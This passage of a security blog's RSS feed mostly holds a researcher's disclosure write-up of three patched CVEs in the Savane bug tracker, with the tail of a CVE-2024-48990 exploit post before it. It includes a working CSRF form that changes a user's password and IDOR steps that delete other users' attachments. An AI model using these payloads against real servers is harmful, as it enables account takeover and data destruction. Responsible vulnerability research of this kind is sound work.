<p>Our target binary is famously triggered as the result of a hook in a package manager after actions such as installing a new package. Let&rsquo;s see what happens when I set up a <code>nc</code> listener and attempt to install <code>nano</code> using <code>apt</code>!</p>
<video width="100%" controls>
    <source src="/videos/CVE-2024-48990_poc.mp4" type="video/mp4">
</video>
<p>It worked! We have successfully identified and exploited the n-day CVE-2024-48990. Thanks for reading!</p>
]]></content:encoded>
    </item>
    <item>
      <title>How I Found 3 CVEs in 2 Days</title>
      <link>https://ally-petitt.com:443/en/posts/2024-03-21_how-i-found-3-cves-in-2-days-8a135eb924d3/</link>
      <pubDate>Thu, 21 Mar 2024 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.com:443/en/posts/2024-03-21_how-i-found-3-cves-in-2-days-8a135eb924d3/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*wGuRqNuBuFV5u69n.png&#34; alt=&#34;&#34;  /&gt;

Author: Ally Petitt&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Christmas break is notoriously refreshing for high schoolers like myself, however, unlike most high school students, I got to spend mine doing the most fascinating work in the world: security research.&lt;/p&gt;
&lt;p&gt;I had previously used Savannah, a GNU bug tracker, to submit a bug report, so when I noticed that the underlying technology, &lt;a href=&#34;https://git.savannah.nongnu.org/cgit/administration/savane.git/&#34;&gt;Savane&lt;/a&gt;, was open source, I knew I had to put it on my list of research projects. To my surprise, I was able to discover 3 CVEs within the span of 2 days including insecure access control, cross-site request forgery (CSRF), and a bad seed vulnerability in Savane v3.12 and prior versions.&lt;/p&gt;
&lt;p&gt;Testing Environment:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Firefox v103.0 (64-bit)&lt;/li&gt;
&lt;li&gt;Debian 12, stable-slim Docker container&lt;/li&gt;
&lt;li&gt;PHP development server&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Note that these aren’t all-encompassing results as my short audit of this application was only over the course of a few days.&lt;/p&gt;
&lt;h1 id=&#34;methodology&#34;&gt;Methodology&lt;/h1&gt;
&lt;p&gt;This audit consisted of both dynamic and static analysis. The majority of my source code analysis methodology can be found &lt;a href=&#34;https://medium.com/@allypetitt/how-to-find-more-vulnerabilities-source-code-auditing-explained-2c8a10896374&#34;&gt;here&lt;/a&gt;. For the sake of brevity, I will only include relevant details for this article. My first step was configuring a local development environment via a &lt;a href=&#34;https://gist.github.com/ally-petitt/3490c857b4c6eeea860c6e094ce47ce3&#34;&gt;Dockerfile I&lt;/a&gt; created.&lt;/p&gt;
&lt;p&gt;With a running instance of Savane, I shifted my focus to source code analysis, pinpointing files of particular interest for security issues including &lt;code&gt;utils.php&lt;/code&gt;, &lt;code&gt;upload.php&lt;/code&gt;, and &lt;code&gt;users.php&lt;/code&gt;. While there were interesting leads, many of them did not pan out how I had hoped, so I began to parse through functionalities with more potential for impact. This led me to authenticated functionalities since any user can create an account and expands the attack surface drastically.&lt;/p&gt;
&lt;h1 id=&#34;account-management&#34;&gt;Account Management&lt;/h1&gt;
&lt;p&gt;I began by assessing account management functionalities such as updating passwords and changing email addresses for Cross-Site Request Forgery (CSRF) or access control vulnerabilities since they happened to be at the forefront of my mind at the time of this audit.&lt;/p&gt;
&lt;p&gt;The majority of the critical account management functionalities appeared to be protected by a&lt;code&gt;form_id&lt;/code&gt; parameter, which contained a randomized string in each request. In effect, &lt;code&gt;form_id&lt;/code&gt; acted as a CSRF token.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Q3BI1WCSQj8kJmb7iCEh4g.png&#34; alt=&#34;&#34;  /&gt;

Additionally, attempting to change the password required the previous user password to be known, which provided no advantage over attempting to brute-force their password to begin with.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*IcA_HpVxf3LP9FlM7miVUw.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;http://172.17.0.2:7890/my/admin/change.php?item=password&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;With these precautions in place, it was evident that further investigation was required.&lt;/p&gt;
&lt;h2 id=&#34;cve-202427631csrf-cwe-352&#34;&gt;CVE-2024–27631 — CSRF (CWE-&lt;strong&gt;352)&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;I suspected that there may be additional critical vulnerabilities without CSRF protection. Specifically, I began to look inside of admin folders in the source code, eventually finding &lt;code&gt;siteadmin/usergroup.php&lt;/code&gt;, which enabled superusers to edit of any user’s profile.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*_stvfUY2HtkR9wda-TgZQQ.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;Example of /siteadmin/usergroup.php to edit the account of user 60079&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;This page contained three unprotected functionalities of interest. The first was a function that can be used to grant a user admin flags, leading to privilege escalation without account takeover.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*TDquE7S3UnTHXilR4TYrVA.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;frontend/php/siteadmin/usergroup.php&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The second and third functionalities could be leveraged for account takeover by either changing the email address of a user’s account:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*HvHtu0HaoxRLzojL3vjfPQ.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;frontend/php/siteadmin/usergroup.php&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Or, changing the password of any user’s account.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*-N45bZ7BrPdguKZWsQs0cw.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;frontend/php/siteadmin/user_changepw.php&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Given these promising leads, I began to develop a Proof-of-Concept (PoC) to demonstrate that the vulnerability existed in practice. (I have found that with static analysis, sometimes a detail in the code can be overlooked that actually mitigates the vulnerability.) The following is what I came up with and successfully tested:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;!--&lt;/span&gt; The efficacy of this payload is browser&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dependent &lt;span style=&#34;color:#f92672&#34;&gt;--&amp;gt;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;form id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;autosubmit&amp;#34;&lt;/span&gt; action&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://&amp;lt;savane\_instance&amp;gt;/siteadmin/user\_changepw.php&amp;#34;&lt;/span&gt; method&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;input name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form\_pw&amp;#34;&lt;/span&gt; type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Password1!&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;input name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form\_pw2&amp;#34;&lt;/span&gt; type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Password1!&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;input name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user\_id&amp;#34;&lt;/span&gt; type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;user\_id&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;input name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;update&amp;#34;&lt;/span&gt; type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Update&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;input type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Submit Request&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;script&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; document&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getElementById(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;autosubmit&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;submit();  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;script&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Thus, I discovered CVE-2024–27631! A patch was implemented in &lt;a href=&#34;https://git.savannah.nongnu.org/cgit/administration/savane.git/commit/?h=i18n&amp;id=d3962d3feb75467489b869204db98e2dffaaaf09&#34;&gt;this commit&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;cve-202427632bad-seed-cwe-335&#34;&gt;CVE-2024–27632 — Bad Seed (CWE-335)&lt;/h2&gt;
&lt;p&gt;While tracing CSRF-related functionalities in the code, I came across the logic for generating and serving the CSRF tokens, or form IDs. The execution flow is as follows:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Protected PHP pages contain a call to &lt;code&gt;form_header()&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;form_header()&lt;/code&gt; function seeds the current Unix timestamp.&lt;/li&gt;
&lt;li&gt;A random number is chosen and hashed to create &lt;code&gt;form_id&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The form ID is added as a hidden element in the form on the protected page.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The definition of &lt;code&gt;form_header()&lt;/code&gt; can be seen in the image below.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Zs5bxl01fMcxsXTfZd4mzw.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;frontend/php/include/form.php&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;I was particularly interested in the mechanism behind seeding the Pseudo-Random Number Generator (&lt;a href=&#34;https://en.wikipedia.org/wiki/Pseudorandom_number_generator&#34;&gt;PRNG&lt;/a&gt;), which occured in &lt;code&gt;utils_srand()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*SIBvRLsqwT0QVwFI1ZczrA.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;frontend/php/include/utils.php&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;It was apparent that &lt;code&gt;[mt\_srand()](https://www.php.net/manual/en/function.mt-srand.php)&lt;/code&gt; was used to seed the &lt;a href=&#34;https://www.php.net/manual/en/function.microtime.php&#34;&gt;Unix timestamp&lt;/a&gt; (learn more about PRNGs &lt;a href=&#34;https://www.geeksforgeeks.org/pseudo-random-number-generator-prng/&#34;&gt;here&lt;/a&gt;). Since this function is called when a protected page is loaded, the seed is renewed with the current time upon visiting the page. If the timestamp that a victim visited a page is known, can be approximated, or can be otherwise triggered, it is possible to independently generate the exact same form ID token, passing the CSRF check! This would allow for CSRF attacks on arbitrary form submissions, leading to potential account takeover.&lt;/p&gt;
&lt;p&gt;Savane v3.13 contains a patch implemented in this &lt;a href=&#34;https://git.savannah.nongnu.org/cgit/administration/savane.git/commit/?h=i18n&amp;id=dee5195d18f9ab16c860e8114819083673f66b95&#34;&gt;commit&lt;/a&gt;.&lt;/p&gt;
&lt;h1 id=&#34;group-management-functionalities&#34;&gt;Group Management Functionalities&lt;/h1&gt;
&lt;p&gt;Another class of functionalities I began to explore was group management. I tested CRUD (Create, Read, Update, and Delete) functionalities utilized when submitting a bug report to a group. I was unable to exploit file uploads in bug reports (I may address this in a future article if enough people are interested), however, I was vigilant on access control issues when I observed the web traffic for deleting an uploaded attachment.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*4Pup6AnABk8L9bM8QGeGow.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;Deleting a file attachment with ID 40225&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;cve-202427630idor-cwe-639&#34;&gt;CVE-2024–27630 — IDOR (&lt;strong&gt;CWE-639&lt;/strong&gt;)&lt;/h2&gt;
&lt;p&gt;Upon submitting a bug report, uploaded files are deposited in the uploads directory (&lt;code&gt;/var/lib/savane/trackers_attachments&lt;/code&gt;) with a file name equivalent to the file’s ID.&lt;/p&gt;
&lt;p&gt;Naturally, I began to investigate the process of deleting a file, a function only accessible to tracker admins. The following function is responsible for handling file deletion on attachments (&lt;code&gt;frontend/php/include/trackers/data.php:2417&lt;/code&gt;):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;function trackers\_data\_delete\_file ($group\_id, $item\_id, $file\_id)  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; global $sys\_trackers\_attachments\_dir;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; # Make sure the attachment belongs to the group.  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; $res = db\_execute (&amp;#34;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; SELECT bug\_id from &amp;#34; . ARTIFACT . &amp;#34; WHERE bug\_id = ? AND group\_id = ?&amp;#34;,  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; [$item\_id, $group\_id]  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; );  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; if (db\_numrows ($res) &amp;lt;= 0)  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; {  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; # TRANSLATORS: the argument is item id (a number).  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; $msg = sprintf (  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; \_(&amp;#34;Item #%s doesn&amp;#39;t belong to project&amp;#34;), $item\_id  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; );  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; fb ($msg, 1);  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; return;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; }  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; $result = false;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; # Delete the attachment.  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; if (unlink (&amp;#34;$sys\_trackers\_attachments\_dir/$file\_id&amp;#34;))   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; $result = db\_execute (&amp;#34;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; DELETE FROM trackers\_file WHERE item\_id = ? AND file\_id = ?&amp;#34;,  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; [$item\_id, $file\_id]  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; );
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The user can control the &lt;code&gt;$item_id&lt;/code&gt; and &lt;code&gt;$file_id&lt;/code&gt; parameters through the URI. Can you spot the vulnerability? It is subtle.&lt;/p&gt;
&lt;p&gt;Note that there is input validation ensure the &lt;code&gt;$file_id&lt;/code&gt; is a number. Otherwise, there would be a directory traversal vulnerability allowing for arbitrary file deletion.&lt;/p&gt;
&lt;p&gt;The function first checks if the user is part of the group corresponding to the &lt;code&gt;$item_id&lt;/code&gt; and proceeds to delete the attachment before running a SQL query updating the database. The &lt;code&gt;$file_id&lt;/code&gt; is not checked at all! This means that as long as the attacker is an admin of the group referenced in &lt;code&gt;$item_id&lt;/code&gt;, they could delete any file.&lt;/p&gt;
&lt;p&gt;I was quite surprised to have spotted this discrepency, but very pleased. The following steps can be taken to reproduce the vulnerability:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Have an account that is an admin of a group with a bugtracker (attacker account).&lt;/li&gt;
&lt;li&gt;With a separate user account (victim), upload a file attachment in a bug report to a group that the attacker is not an admin of. A sample of the subsequent upload directory is as follows:&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;ae93fe131f:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lib&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;savane&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;trackers\_attachments&lt;span style=&#34;color:#75715e&#34;&gt;# ls  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40226&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40227&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40230&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40231&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;
&lt;p&gt;Visit the homepage of the group that the attacker is an admin of. Then, visit Bugs &amp;gt; Browse and note a valid Item ID on the leftmost column of the table. This ID will be used in the next step.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;As the attacker, make a get request to the path &lt;code&gt;/bugs/index.php?func=delete_file&amp;amp;item_id=&amp;lt;ATTACKER_ITEM_ID&amp;gt;&amp;amp;item_file_id=&amp;lt;FILE_ID_TO_DELETE&amp;gt;&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;In my case, this looks like &lt;a href=&#34;http://172.17.0.2:7890/bugs/index.php?func=delete_file&amp;item_id=50697&amp;item_file_id=40231&#34;&gt;http://172.17.0.2:7890/bugs/index.php?func=delete_file&amp;item_id=50697&amp;item_file_id=40231&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Verify that the victim’s file (from a group the attacker doesn’t have privileges on) has been deleted.&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;ae93fe131f:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;lib&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;savane&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;trackers\_attachments&lt;span style=&#34;color:#75715e&#34;&gt;# ls  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40226&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40227&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40230&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Due to the incremental file names, it is possible for an attacker to iteratively delete every file attachment on the web server! Since recently uploaded files harbor the highest file ID numbers, an attacker can upload a file, observe the ID, and delete every ID below that number as one would in an Insecure Direct Object Reference (IDOR) vulnerabillity. This vulnerability was patched &lt;a href=&#34;https://git.savannah.nongnu.org/cgit/administration/savane.git/commit/?h=i18n&amp;id=39180aea8f38425035b4d1e73819b58007ac6e83&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;thanks&#34;&gt;Thanks&lt;/h2&gt;
&lt;p&gt;Special thanks to Ineiev, the maintainer of Savane. He was very receptive to my responsible disclosure and helped take steps to patch it.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Combing through Savane’s source code was one of the highlights of my Christmas break. While discovering 3 CVEs came as a surprise, I am appreciative of the educational value of this experience. I hope that you learned something from this writeup. If you have any questions or comments, feel free to reach out to me on &lt;a href=&#34;https://www.linkedin.com/in/ally-petitt/&#34;&gt;LinkedIn&lt;/a&gt;!&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*wGuRqNuBuFV5u69n.png" alt=""  />

Author: Ally Petitt</p>
<h1 id="introduction">Introduction</h1>
<p>Christmas break is notoriously refreshing for high schoolers like myself, however, unlike most high school students, I got to spend mine doing the most fascinating work in the world: security research.</p>
<p>I had previously used Savannah, a GNU bug tracker, to submit a bug report, so when I noticed that the underlying technology, <a href="https://git.savannah.nongnu.org/cgit/administration/savane.git/">Savane</a>, was open source, I knew I had to put it on my list of research projects. To my surprise, I was able to discover 3 CVEs within the span of 2 days including insecure access control, cross-site request forgery (CSRF), and a bad seed vulnerability in Savane v3.12 and prior versions.</p>
<p>Testing Environment:</p>
<ul>
<li>Firefox v103.0 (64-bit)</li>
<li>Debian 12, stable-slim Docker container</li>
<li>PHP development server</li>
</ul>
<p>Note that these aren’t all-encompassing results as my short audit of this application was only over the course of a few days.</p>
<h1 id="methodology">Methodology</h1>
<p>This audit consisted of both dynamic and static analysis. The majority of my source code analysis methodology can be found <a href="https://medium.com/@allypetitt/how-to-find-more-vulnerabilities-source-code-auditing-explained-2c8a10896374">here</a>. For the sake of brevity, I will only include relevant details for this article. My first step was configuring a local development environment via a <a href="https://gist.github.com/ally-petitt/3490c857b4c6eeea860c6e094ce47ce3">Dockerfile I</a> created.</p>
<p>With a running instance of Savane, I shifted my focus to source code analysis, pinpointing files of particular interest for security issues including <code>utils.php</code>, <code>upload.php</code>, and <code>users.php</code>. While there were interesting leads, many of them did not pan out how I had hoped, so I began to parse through functionalities with more potential for impact. This led me to authenticated functionalities since any user can create an account and expands the attack surface drastically.</p>
<h1 id="account-management">Account Management</h1>
<p>I began by assessing account management functionalities such as updating passwords and changing email addresses for Cross-Site Request Forgery (CSRF) or access control vulnerabilities since they happened to be at the forefront of my mind at the time of this audit.</p>
